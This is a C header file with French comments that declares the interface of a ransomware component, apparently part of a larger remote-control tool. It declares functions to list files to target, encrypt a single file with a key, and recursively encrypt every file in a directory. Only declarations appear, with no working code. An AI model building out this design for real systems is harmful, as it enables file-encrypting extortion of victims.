/**
 * @file ransomware.h
 * @brief Fonctionnalités de ransomware
 * @author Valentin Pizzio
 * @date 21/12/2024
 * 
 * Ce fichier définit les fonctions pour le composant ransomware
 * qui permet de chiffrer et déchiffrer des fichiers dans un répertoire.
 */

#ifndef RANSOMWARE_H
#define RANSOMWARE_H

#include <windows.h>
#include "protocol.h"

/**
 * @brief Liste les fichiers pour le ransomware
 * 
 * Cette fonction liste les fichiers dans un répertoire donné qui peuvent
 * être ciblés par le ransomware.
 * 
 * @param buffer Buffer où stocker la liste des fichiers
 * @param buffer_size Taille maximale du buffer
 * @param directory Répertoire à analyser
 */
void list_files_for_ransomware(char* buffer, size_t buffer_size, const char* directory);

/**
 * @brief Chiffre un fichier
 * 
 * Cette fonction chiffre le contenu d'un fichier en utilisant une clé donnée.
 * Elle vérifie également si le fichier n'est pas déjà chiffré.
 * 
 * @param filename Nom du fichier à chiffrer
 * @param key Clé de chiffrement
 * @return int 0 en cas de succès, -1 en cas d'erreur
 */
int encrypt_file(const char* filename, const char* key);

/**
 * @brief Chiffre tous les fichiers d'un répertoire
 * 
 * Cette fonction parcourt récursivement un répertoire et chiffre tous
 * les fichiers qu'il contient avec une clé donnée.
 * 
 * @param directory Répertoire à chiffrer
 * @param key Clé de chiffrement
 * @param buffer Buffer pour stocker les messages d'état
 * @param buffer_size Taille maximale du buffer
 */
void ransomware_directory(const char* directory, const char* key, char* buffer, size_t buffer_size);

#endif // RANSOMWARE_H
